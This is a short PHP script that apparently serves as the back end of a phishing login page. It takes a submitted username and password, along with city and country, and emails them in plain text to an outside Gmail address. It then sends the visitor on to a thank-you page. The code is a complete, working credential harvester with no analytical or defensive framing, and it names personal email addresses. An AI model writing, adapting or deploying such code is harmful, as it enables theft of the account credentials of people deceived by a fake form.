<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the form data
    $username = isset($_POST["username"]) ? $_POST["username"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $city = isset($_POST["city"]) ? $_POST["city"] : "";
    $country = isset($_POST["country"]) ? $_POST["country"] : "";

    // Send email
    $to = "martinbuffet719@gmail.com"; // Replace with your Gmail address
    $subject = "New Form Submission";
    $message = "Username: $username\nPassword: $password\nLocation: $city\nLatitude: $country";

    // Additional headers
    $headers = "From: johnasbrother98@gmail.com"; // Replace with your email address

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        // Email sent successfully
        header('Location: ../thankyou/index.html'); // Redirect to the thank-you page
        exit;
    } else {
        // Failed to send email
        http_response_code(500); // Internal Server Error
        echo 'Failed to send email. Please try again later.';
    }
} else {
    // Respond with an error if it's not a POST request
    http_response_code(400); // Bad Request
    echo 'Invalid request. Please use POST to submit the form.';
}
?>
